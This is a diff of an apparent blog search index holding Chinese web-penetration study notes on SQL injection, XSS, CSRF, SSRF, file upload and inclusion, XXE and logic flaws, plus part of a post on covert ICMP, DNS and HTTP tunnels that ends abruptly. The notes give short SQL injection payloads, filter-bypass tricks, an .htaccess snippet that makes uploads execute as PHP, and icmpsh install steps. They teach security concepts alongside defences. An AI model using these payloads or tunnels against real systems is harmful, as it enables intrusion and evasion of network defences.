class="line">二次渲染：文件上传后经过二次渲染重新生成图片容易把图片里的php代码改掉，把图片里的php代码放到前面</span><br><span class="line">条件竞争：不断上传，不断访问。</span><br><span class="line">%00截断：：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态</span><br></pre></td></tr></table></figure>
-
-<h2 id="6-文件包含"><a href="#6-文件包含" class="headerlink" title="6.文件包含"></a>6.文件包含</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在网站的开发人员在开发网站的时候，会把经常重复使用的函数或者特定的页面写到单个文件中，需要使用的时候就直接调用此文件即可，而无需再次浪费时间再次编写，这种操作通常被称为文件包含。</span><br></pre></td></tr></table></figure>
-
-<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include()：包含并运行指定的文件，包含文件发生错误时，程序警告，但会继续执行。</span><br><span class="line">require()：包含并运行指定的文件，包含文件发生错误时，程序直接终止执行。</span><br><span class="line">include_once()：和 include 类似，不同处在于 include_once 会检查这个文件是否已经被导入，如果已导入，下文便不会再导入，直面 once 理解就是只导入一次。</span><br><span class="line">require_once()：和 require 类似，不同处在于 require_once 只导入一次。</span><br></pre></td></tr></table></figure>
-
-<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.本地文件包含</span><br><span class="line">2.远程文件包含需要php.ini开启了allow_url_fopen默认开启和allow_url_include默认关闭</span><br></pre></td></tr></table></figure>
-
-<h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.php://input</span><br><span class="line">2.php://filter</span><br></pre></td></tr></table></figure>
-
-<h3 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.检查服务器配置文件</span><br><span class="line">2.过滤特殊符号 ，\/input output filter</span><br></pre></td></tr></table></figure>
-
-<h2 id="XXE（外部实体注入）"><a href="#XXE（外部实体注入）" class="headerlink" title="XXE（外部实体注入）"></a>XXE（外部实体注入）</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当包含对外部实体的引用的 XML 输入被弱配置的 XML 解析器处理时，就会发生这种攻击。这种攻击可能导致机密数据泄露、拒绝服务、服务器端请求伪造、从解析器所在机器的角度进行端口扫描，以及其他系统影响。</span><br><span class="line"></span><br><span class="line">XML很像html语言，但标签需要自己来定义。</span><br><span class="line">XML用于传输和数据存储。HTML用于显示数据。</span><br></pre></td></tr></table></figure>
-
-<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.DOS攻击</span><br><span class="line">2.文件读取</span><br><span class="line">3.内网探测</span><br></pre></td></tr></table></figure>
-
-<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.使用开发语言提供的禁用外部实体的方法</span><br><span class="line">PHP：</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line">Python：</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br><span class="line">2.过滤和验证用户提交的XML数据</span><br><span class="line">3.过滤关键词&lt;!DOCTYPE、&lt;!ENTITY SYSTEM、PUBLIC</span><br><span class="line">4.不允许XML中含有任何自己声明的DTD</span><br></pre></td></tr></table></figure>
-
-<h2 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h2><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.身份验证漏洞</span><br><span class="line">暴力破解</span><br><span class="line">Session固定攻击</span><br><span class="line">Cookie欺骗漏洞</span><br><span class="line">2.权限类逻辑漏洞</span><br><span class="line">水平越权</span><br><span class="line">垂直越权</span><br><span class="line">未授权访问</span><br><span class="line">3.图形验证码漏洞</span><br><span class="line">4.找回密码逻辑洞</span><br><span class="line">5.业务逻辑篡改漏洞</span><br><span class="line">6.执行顺序篡改漏洞</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web渗透基础</tag>
       </tags>
   </entry>
   <entry>
@@ -882,6 +812,76 @@
       </tags>
   </entry>
   <entry>
+    <title>web基础总结</title>
+    <url>/2022/01/05/web%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<span id="more"></span>
+
+<h1 id="一、web"><a href="#一、web" class="headerlink" title="一、web"></a>一、web</h1><h2 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h2><h3 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web应用程序对用户输入的数据过滤不严谨，并且把用户输入的数据当作sql语句去执行。</span><br></pre></td></tr></table></figure>
+
+<h3 id="sql注入分类"><a href="#sql注入分类" class="headerlink" title="sql注入分类"></a>sql注入分类</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反馈结果上分为</span><br><span class="line">	有回显型</span><br><span class="line">	无回显型</span><br><span class="line">攻击手法上分为</span><br><span class="line">	1.联合查询注入 union select</span><br><span class="line">	2.堆叠注入 在SQL语句中，语句的结束都是以&#x27;;&#x27;结尾，但是如果我们在&#x27;;&#x27;后面再加上一条SQL语句，两条语句会一起执行</span><br><span class="line">	3.报错注入 updatexml、floor、ExtractValue </span><br><span class="line">	ExtractValue 接收两个字符串参数，1传入xml文档，2是Xpath路径表示法表示的查找路径，语法错误就会报错</span><br><span class="line">	extracrvalue(0,concat(0x7e,database()))</span><br><span class="line">	UpdateXML 三个参数，1操作片段2xml路径3更新内容</span><br><span class="line">	updatexml(0,concat(0x7e,select database()),1)</span><br><span class="line">	floor，group by向临时表插入数据，rand多次计算报错。报错前concat中的语句被执行。</span><br><span class="line">	concat(floor(rand(0)*2),database()) x from information_schema.schemata group by </span><br><span class="line">	exp是个数学函数。</span><br><span class="line">	4.盲注</span><br><span class="line">		时间盲注    if sleep</span><br><span class="line">		布尔盲注    count，length</span><br><span class="line">	5.二次注入  sql-labs24关，插入admin‘# 修改密码，修改的是admin的密码</span><br><span class="line">	6.宽字节注入 php发送请求到mysql使用了gbk编码。%df吃掉%5c（\）</span><br><span class="line">	character_set_client(客户端的字符集)和character_set_connection(连接层的字符集)不同,或转换函数如，iconv、mb_convert_encoding使用不当。</span><br><span class="line">	7.mysql写shell用的函数outfile、dumpfile、开启log写shell</span><br><span class="line">	8.为什么参数化查询可以防止sql注入</span><br><span class="line">使用参数化查询数据库服务器不会把参数的内容当作sql指令的一部分来执行，是在数据库完成sql指令的编译后才套用参数运行</span><br><span class="line">简单的说: 参数化能防注入的原因在于,语句是语句，参数是参数，参数的值并不是语句的一部分，数据库只按语句的语义跑</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="sql常用语句"><a href="#sql常用语句" class="headerlink" title="sql常用语句"></a>sql常用语句</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查库selsct schema_name from information_schema.schemata</span><br><span class="line">查表select table_name from information_schema.tables where table_schema=&#x27;security&#x27;</span><br><span class="line">查列select column_name from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">查字段select username,password from security.users</span><br><span class="line">if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="sql注入绕过"><a href="#sql注入绕过" class="headerlink" title="sql注入绕过"></a>sql注入绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.注释符（#   --+）</span><br><span class="line">2.大小写绕过（or and ）</span><br><span class="line">3.双写绕过（oorrder）</span><br><span class="line">4.空格绕过 /**/  %09（Tab）</span><br><span class="line">5.对字符进行转义</span><br></pre></td></tr></table></figure>
+
+<h3 id="sql注入防御"><a href="#sql注入防御" class="headerlink" title="sql注入防御"></a>sql注入防御</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.代码层</span><br><span class="line">黑名单、白名单、敏感字符过滤、规范输出</span><br><span class="line">2.配置层</span><br><span class="line">开启gpc（php的防御函数魔术引号开关）、使用utf-8</span><br><span class="line">3.物理层面</span><br><span class="line">WAF、IPS、数据库审计</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-xss（跨站脚本攻击）"><a href="#2-xss（跨站脚本攻击）" class="headerlink" title="2.xss（跨站脚本攻击）"></a>2.xss（跨站脚本攻击）</h2><h3 id="xss原理"><a href="#xss原理" class="headerlink" title="xss原理"></a>xss原理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者在web页面中会插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。</span><br></pre></td></tr></table></figure>
+
+<h3 id="xss分类"><a href="#xss分类" class="headerlink" title="xss分类"></a>xss分类</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.反射型</span><br><span class="line">一般指攻击者通过特定的方式来诱惑受害者去访问一个包含恶意代码的URL。当受害者点击恶意链接url的时候，恶意代码会直接在受害者的主机上的浏览器执行。</span><br><span class="line">2.存储型</span><br><span class="line">主要是将恶意代码上传或存储到服务器中，下次只要受害者浏览包含此恶意代码的页面就会执行恶意代码。</span><br><span class="line">3.DOM型</span><br><span class="line">不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom - xss是通过url传入参数去控制触发的。</span><br><span class="line">区别</span><br><span class="line">12都需要服务器解析，并与数据库交互3只用前端解析，不与数据库交互</span><br><span class="line">23都会将攻击代码长期存在到受害者服务器1只能攻击一次</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="xss绕过"><a href="#xss绕过" class="headerlink" title="xss绕过"></a>xss绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a标签、src属性、大小写、双写</span><br></pre></td></tr></table></figure>
+
+<h3 id="xss防护"><a href="#xss防护" class="headerlink" title="xss防护"></a>xss防护</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">编码、WAF、filter过滤敏感字符</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-csrf（跨站请求伪造攻击）"><a href="#3-csrf（跨站请求伪造攻击）" class="headerlink" title="3.csrf（跨站请求伪造攻击）"></a>3.csrf（跨站请求伪造攻击）</h2><h3 id="csrf原理"><a href="#csrf原理" class="headerlink" title="csrf原理"></a>csrf原理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">同一浏览器下，用户访问了攻击者的恶意链接，攻击者拿着你的“身份凭证”，冒充你进行相应的攻击。</span><br></pre></td></tr></table></figure>
+
+<h3 id="csrf防护"><a href="#csrf防护" class="headerlink" title="csrf防护"></a>csrf防护</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.验证HTTP Referer字段</span><br><span class="line">2.在请求地址中添加Token验证</span><br><span class="line">3.在HTTP头中自定义属性并验证</span><br></pre></td></tr></table></figure>
+
+<h3 id="csrf位置"><a href="#csrf位置" class="headerlink" title="csrf位置"></a>csrf位置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密码修改、点赞、删除、转账、注销</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-ssrf（服务端请求伪造攻击）"><a href="#4-ssrf（服务端请求伪造攻击）" class="headerlink" title="4.ssrf（服务端请求伪造攻击）"></a>4.ssrf（服务端请求伪造攻击）</h2><h3 id="ssrf原理"><a href="#ssrf原理" class="headerlink" title="ssrf原理"></a>ssrf原理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者在访问A时，利用A的特定功能构造特殊payload，由A发起对内部网络中系统B（内网隔离，外部不可访问）的请求，从而获取敏感信息。</span><br><span class="line"></span><br><span class="line">1- 服务器允许向其他服务器获取资源</span><br><span class="line">2- 但是并没有对该地址做严格的过滤和限制</span><br><span class="line">3- 所以导致了攻击者可以向受害者服务器，传入任意的URL 地址，并将数据返回</span><br></pre></td></tr></table></figure>
+
+<h3 id="ssrf原因"><a href="#ssrf原因" class="headerlink" title="ssrf原因"></a>ssrf原因</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_get_contents()、fsockopen()、curl_exec()这三个函数运用不当。</span><br></pre></td></tr></table></figure>
+
+<h3 id="ssrf位置"><a href="#ssrf位置" class="headerlink" title="ssrf位置"></a>ssrf位置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.分享：通过URL地址分享网页内容</span><br><span class="line">2.转码服务</span><br><span class="line">3.在线翻译</span><br><span class="line">4.图片加载与下载：通过URL地址加载或下载图片</span><br><span class="line">5.图片、文章收藏功能</span><br><span class="line">6.未公开的api实现以及其他调用URL的功能</span><br><span class="line">7.从URL关键字中寻找</span><br></pre></td></tr></table></figure>
+
+<h3 id="ssrf防护"><a href="#ssrf防护" class="headerlink" title="ssrf防护"></a>ssrf防护</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">禁止302跳转、限制协议只保留HTTP、HTTPS，防止file://、gopher://和ftp://、内外网限制、URL限制</span><br><span class="line">地址做白名单</span><br></pre></td></tr></table></figure>
+
+<h3 id="csrf和ssrf区别"><a href="#csrf和ssrf区别" class="headerlink" title="csrf和ssrf区别"></a>csrf和ssrf区别</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">csrf是服务器端对对用户的数据像cookie信息等重要数据没有做严格把控，使得攻击者窃取信息进行伪造发送给服务器</span><br><span class="line">ssrf是服务器对用户提供的url地址过于信任，没有检测，导致攻击者可以通过这个跳板攻击内网。</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-文件上传"><a href="#5-文件上传" class="headerlink" title="5.文件上传"></a>5.文件上传</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。</span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MIME类型检测：HTTP请求字段里的Content-Type字段改为image/jpeg；image/png；image/gif</span><br><span class="line">黑名单绕过：php3、php4、大小写</span><br><span class="line">.htaccess绕过：1.mod_rewrite模块开启。2.AllowOverride All，该目录的文件按php来解析执行</span><br><span class="line">&lt;FilesMatch &quot;shana&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">::$DATA绕过：会把这个后面的后缀名当成文件流处理。</span><br><span class="line">点、空格、大小写、双写绕过</span><br><span class="line">图片马绕过：绕过getimagesize()方法、exif_imagetype()需要开启php的配置文件中的php_exif模块。</span><br><span class="line">二次渲染：文件上传后经过二次渲染重新生成图片容易把图片里的php代码改掉，把图片里的php代码放到前面</span><br><span class="line">条件竞争：不断上传，不断访问。</span><br><span class="line">%00截断：：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-文件包含"><a href="#6-文件包含" class="headerlink" title="6.文件包含"></a>6.文件包含</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在网站的开发人员在开发网站的时候，会把经常重复使用的函数或者特定的页面写到单个文件中，需要使用的时候就直接调用此文件即可，而无需再次浪费时间再次编写，这种操作通常被称为文件包含。</span><br></pre></td></tr></table></figure>
+
+<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include()：包含并运行指定的文件，包含文件发生错误时，程序警告，但会继续执行。</span><br><span class="line">require()：包含并运行指定的文件，包含文件发生错误时，程序直接终止执行。</span><br><span class="line">include_once()：和 include 类似，不同处在于 include_once 会检查这个文件是否已经被导入，如果已导入，下文便不会再导入，直面 once 理解就是只导入一次。</span><br><span class="line">require_once()：和 require 类似，不同处在于 require_once 只导入一次。</span><br></pre></td></tr></table></figure>
+
+<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.本地文件包含</span><br><span class="line">2.远程文件包含需要php.ini开启了allow_url_fopen默认开启和allow_url_include默认关闭</span><br></pre></td></tr></table></figure>
+
+<h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.php://input</span><br><span class="line">2.php://filter</span><br></pre></td></tr></table></figure>
+
+<h3 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.检查服务器配置文件</span><br><span class="line">2.过滤特殊符号 ，\/input output filter</span><br></pre></td></tr></table></figure>
+
+<h2 id="XXE（外部实体注入）"><a href="#XXE（外部实体注入）" class="headerlink" title="XXE（外部实体注入）"></a>XXE（外部实体注入）</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当包含对外部实体的引用的 XML 输入被弱配置的 XML 解析器处理时，就会发生这种攻击。这种攻击可能导致机密数据泄露、拒绝服务、服务器端请求伪造、从解析器所在机器的角度进行端口扫描，以及其他系统影响。</span><br><span class="line"></span><br><span class="line">XML很像html语言，但标签需要自己来定义。</span><br><span class="line">XML用于传输和数据存储。HTML用于显示数据。</span><br></pre></td></tr></table></figure>
+
+<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.DOS攻击</span><br><span class="line">2.文件读取</span><br><span class="line">3.内网探测</span><br></pre></td></tr></table></figure>
+
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.使用开发语言提供的禁用外部实体的方法</span><br><span class="line">PHP：</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line">Python：</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br><span class="line">2.过滤和验证用户提交的XML数据</span><br><span class="line">3.过滤关键词&lt;!DOCTYPE、&lt;!ENTITY SYSTEM、PUBLIC</span><br><span class="line">4.不允许XML中含有任何自己声明的DTD</span><br></pre></td></tr></table></figure>
+
+<h2 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h2><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.身份验证漏洞</span><br><span class="line">暴力破解</span><br><span class="line">Session固定攻击</span><br><span class="line">Cookie欺骗漏洞</span><br><span class="line">2.权限类逻辑漏洞</span><br><span class="line">水平越权</span><br><span class="line">垂直越权</span><br><span class="line">未授权访问</span><br><span class="line">3.图形验证码漏洞</span><br><span class="line">4.找回密码逻辑洞</span><br><span class="line">5.业务逻辑篡改漏洞</span><br><span class="line">6.执行顺序篡改漏洞</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web渗透基础</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>权限提升</title>
     <url>/2022/04/03/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
     <content><![CDATA[<span id="more"></span>
@@ -1105,6 +1105,126 @@
       </tags>
   </entry>
   <entry>
+    <title>隐藏通信隧道</title>
+    <url>/2022/02/17/%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93/</url>
+    <content><![CDATA[<span id="more"></span>
+
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>一般的网络通信，两个机器先建立TCP连接，然后正常数据通信，知道ip地址后可直接发送报文，不知道可以用域名解析，但是在实际中，可通过边界设备、软硬waf、ids检查阻断连接。</p>
+<p>隧道就是绕过端口屏蔽的通信方式，waf两端数据包通过waf允许的数据包类型或端口进行封装，穿过防火墙，进行通信。当封装的数据包到达目的地，进行还原，并将其还原后的数据包发送到相应的服务器上。</p>
+<p>CS、MSF无法上线，数据传输不稳定无回显、出口数据被监控、网络通信存在问题。</p>
+<p>常用隧道：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">网络层：IPv6、ICMP、GRE</span><br><span class="line">传输层：TCP、UDP、常规端口</span><br><span class="line">应用层：SSH、HTTP、HTTPS、DNS</span><br></pre></td></tr></table></figure>
+
+<h2 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h2><p>执行ping</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402090732542.png" alt="image-20220402090732542"></p>
+<h2 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h2><p>netcat（nc）瑞士军刀，工具，通过使用TCP或者UDP协议的网络连接读写数据。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402091737750.png" alt="image-20220402091737750"></p>
+<h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><p>curl是一个利用url规则在命令行下工作的综合文件传输工具，支持文件上传下载。curl不仅支持HTTP、HTTPS、FTP等多种协议，还支持POST、Cookie、认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。Linux操作系统自带curl命令。在Windows操作系统中,需要下载并安装curl命令</p>
+<p>在使用curl时,需要执行“curl&lt; IP地址:端口号 &gt;”命令。如果远程主机开启了相应的端口，会输出相应的端口信息，如图3-3所示。如果远程主机没有开通相应的端口，则没有任何提示。按“Ctrl+C”键即可断开连接。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402092506527.png" alt="image-20220402092506527"></p>
+<h2 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h2><p>在进行 DNS连通性检测时，常用的命令为nslookup和 dig。<br>nslookup是 Windows操作系统自带的 DNS 探测命令，其用法如下所示。在没有指定 vps-ip时，nslookup 会从系统网络的TCP&#x2F;IP属性中读取 DNS服务器的地址。具体的使用方法是:打开Windows操作系统的命令行环境,输人“nslookup”命令,按“回车”键,然后输入“help”命令</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402092938431.png" alt="image-20220402092938431"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup www.baidu.com vps-ip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402093948502.png" alt="image-20220402093948502"></p>
+<p>dig是 Linux默认自带的 DNS 探测命令，其用法如下所示。在没有指定vps-ip时,dig会到<br>&#x2F;etc&#x2F;resolv.conf文件中读取系统配置的 DNS服务器的地址。如果vps-ip为192.168.43.1，将解析百度网的IP地址，说明目前DNS协议是连通的,如图3-5所示。具体的使用方法，可在 Linux命令行环境中输入“dig -h”命令获取。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dig @vps-ip www.baidu.com（解析结果）</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402093550235.png" alt="image-20220402093550235"></p>
+<p>还有一种情况是流量不能直接流出，需要在内网中设置代理服务器，常见于通过企业办公网段上网的场景。常用的判断方法如下。<br>    查看网络连接，判断是否存在与其他机器的8080（不绝对）等端口的连接（可以尝试运行”ping -n 1 -a ip”命令)。<br>②查看内网中是否有主机名类似于“proxy”的机器。</p>
+<p>③查看IE浏览器的直接代理。</p>
+<p>④根据pac文件的路径（可能是本地路径，也可能是远程路径)，将其下载下来并查看。</p>
+<p>⑤执行如下命令，利用curl工具进行确认。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl www.baidu. com//不通</span><br><span class="line">curl -x proxy-ip:port www.baidu . com//通</span><br></pre></td></tr></table></figure>
+
+<h1 id="网络层隧道技术"><a href="#网络层隧道技术" class="headerlink" title="网络层隧道技术"></a>网络层隧道技术</h1><p>在网络层中，两个常用的 隧道协议是IPv6和ICMP，下面进行介绍</p>
+<h2 id="IPv6隧道"><a href="#IPv6隧道" class="headerlink" title="IPv6隧道"></a>IPv6隧道</h2><h3 id="技术简介"><a href="#技术简介" class="headerlink" title="技术简介"></a>技术简介</h3><p>“IPv6”是“Internet Protocol Version 6”的缩写，也被称为下一代互联网协议。它是由IETF设计用来代替现行的IPv4协议的一种新的IP协议。IPv4协议已经使用了20多年，目前面临着地址匮乏等一系列问题，而IPv6则能从根本上解决这些问题。现在，由于IPv4资源几乎耗尽，IPv6开始进入过渡阶段。</p>
+<p>IPv6隧道技术是指通过IPv4隧道传送 IPv6 数据报文的技术。为了在IPv4海洋中传递IPv6信息，可以将IPv4作为隧道载体,将IPv6报文整体封装在IPv4数据报文中,使IPv6报文能够穿过IPv4海洋,到达另一个IPv6小岛。<br>打个比方，快递公司收取包裹之后，发现自己在目的地没有站点，无法投送，则将此包裹转交给能到达目的地的快递公司（例如中国邮政）来投递。也就是说，将快递公司已经封装好的包裹（类似于IPv6报文)，用中国邮政的包装箱再封装一次（类似于封装成IPv4报文)，以便这个包裹在中国邮政的系统（IPv4海洋）中被正常投递。</p>
+<p>攻击者有时会通过恶意软件来配置允许进行IPv6通信的设备，以避开防火墙和入侵检测系统。有一点需要指出:即使设备支持IPv6，也可能无法正确分析封装了IPv6报文的IPv4数据包。<br>配置隧道和自动隧道的主要区别是:只有在执行隧道功能的节点的IPv6地址是 IPv4兼容地址时，自动隧道才是可行的。在为执行隧道功能的节点分配IP地址时,如果采用的是自动隧道方法，就不需要进行配置。<br>配置隧道方法则要求隧道末端节点使用其他机制来获得其IPv4地址，例如采用DHCP、人工配置或其他 IPv4的配置机制。<br>支持IPv6的隧道工具有socat、6tunnel、nt6tunnel 等。</p>
+<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>针对IPv6隧道攻击，最好的防御方法是:了解IPv6的具体漏洞，结合其他协议，通过防火墙和深度防御系统过滤IPv6通信,提高主机和应用程序的安全性。</p>
+<h2 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h2><p>ICMP隧道简单、实用,是一个比较特殊的协议。在一般的通信协议里,如果两台设备要进行通信，肯定需要开放端口，而在ICMP协议下就不需要。最常见的ICMP消息为ping 命令的回复，攻击者可以利用命令行得到比回复更多的ICMP请求。在通常情况下，每个 ping命令都有相对应的回复与请求。</p>
+<p>在一些网络环境中,如果攻击者使用各类上层隧道(例如 HTTP隧道、DNS隧道、常规正&#x2F;反向端口转发等）进行的操作都失败了，常常会通过ping 命令访问远程计算机，尝试建立ICMP隧道,将 TCP&#x2F;UDP 数据封装到ICMP的 ping 数据包中，从而穿过防火墙(通常防火墙不会屏蔽ping 数据包)，实现不受限制的网络访问。</p>
+<p>常用的ICMP隧道工具有icmpsh、PingTunnel、icmptunnel、powershell icmp等。</p>
+<h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><p>kali linux安装icmpsh</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/inquisb/icmpsh.git</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402123633553.png" alt="image-20220402123633553"></p>
+<p>安装 Python的 impacket类库,以便对TCP、UDP、ICMP、IGMP、ARP、IPv4、IPv6、SMB、MSRPC、NTLM、Kerberos、WMI、LDAP等协议进行访问。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install python-impacket </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402123728167.png" alt="image-20220402123728167"></p>
+<p>因为 icmpsh 工具要代替系统本身的 ping命令的应答程序，所以需要输入如下命令来关闭本地系统的ICMP应答(（如果要恢复系统应答，则设置为0)，否则 Shell 的运行会不稳定（表现为一直刷屏，无法进行交互输入)。</p>
